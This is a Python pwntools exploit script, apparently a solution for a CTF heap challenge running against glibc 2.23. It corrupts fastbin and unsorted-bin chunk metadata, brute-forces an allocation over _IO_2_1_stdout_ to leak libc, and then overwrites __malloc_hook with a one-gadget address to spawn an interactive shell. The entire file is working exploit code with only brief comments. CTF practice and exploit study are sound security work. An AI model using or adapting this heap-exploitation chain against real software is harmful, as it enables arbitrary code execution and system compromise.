from pwn import *
from heaputils import *

def make(content, size, idx):
	p.sendlineafter("choice >> ","1")
	p.sendlineafter("wlecome input your size of weapon: ",str(size))
	p.sendlineafter("input index: ",str(idx))
	p.sendafter("input your name:",content)

def delete(idx):
	p.sendlineafter("choice >> ","2")
	p.sendlineafter("input idx :",str(idx))
	p.recvuntil("Done!")

def rename(content,idx):
	p.sendlineafter("choice >> ","3")
	p.sendlineafter("input idx: ",str(idx))
	p.sendafter("new content:",content)
	p.recvuntil("Done !")

def debug():
	bp = [0xC11]
	script = ""
	PIE = get_PIE(p,5)
	for x in bp:
		script += "b *0x%x\n"%(PIE+x)
	gdb.attach(p,gdbscript=script)

def exploit():
	# make unsorted bin
	global p
	p = process(["./ld-2.23.so","./pwn"],env={"LD_PRELOAD":"./libc-2.23.so"})
	make(p64(0)+p64(0x21),0x10,0)
	make("A"*0x60, 0x60, 1)
	make("B"*0x10,0x10,2)
	make("C"*0x10,0x10,3)
	delete(3)
	delete(2)
	delete(1)
	# overwrite size field of "A"*0x60 chunk to something large enough
	rename(chr(0x10),2)	
	make(p64(0)+p64(0x21), 0x10, 2)
	make(p64(0)+p64(0xb1), 0x10, 3)
	make(p64(0)+p64(0x21), 0x10, 4)
	delete(1)
	
	# get _IO_2_1_stdout allocated (possible!), alter it to trigger leak
	# our target is _IO_2_1_stderr_+157 (0x7f30648595dd)
	# unsorted bin fd is 0x00007f3064858b78)
	# bruteforce 4 bits
	rename(p64(0)+p64(0x71), 3)
	#cheat = (get_PIE(p,0) + e.symbols['_IO_2_1_stderr_'] + 157) & 0xFFFF
	cheat = 0x95dd
	rename(p16(cheat), 1)

	make("\xcc"*0x60,0x60,5)
	# if we are lucky, we will get stdout allocated
	try:
		context.log_level = 'debug'
		pay = "\xcc"*3+p64(0)*6+p64(0xfbad3c80)+p64(0)*3+chr(0)
		make(pay, 0x60, 6)
	except:
		log.failure("not lucky enough!")
		p.close()
		return False	
	# fastbin attack on __malloc_hook or vtable
	leak = p.recvuntil("1. create you weapon")[0x41:0x49]
	LIBC = u64(leak) - e.symbols['_IO_2_1_stderr_']-192

	if LIBC >> 40 != 0x7f or LIBC & 0xFFF != 0:
		log.failure("not lucky enough!")
		p.close()
		return False

	log.info("LIBC: 0x%x"%LIBC)

	target = LIBC + e.symbols['__malloc_hook']-0x23
	delete(5)
	rename(p64(target), 5)

	make("\xcc"*0x60,0x60,7)
	oneshot = LIBC + 0x4526a
	pay = "A"*0x13+p64(oneshot)
	make(pay,0x60,8)
	
	p.sendlineafter("choice >> ","1")
	p.sendlineafter("wlecome input your size of weapon: ","10")
	p.sendlineafter("input index: ","0")
	
	stop = True
	p.interactive()
	exit(0)

if __name__ == "__main__":
	stop = False
	e = ELF("./libc-2.23.so")
	while not stop:
		exploit()

	


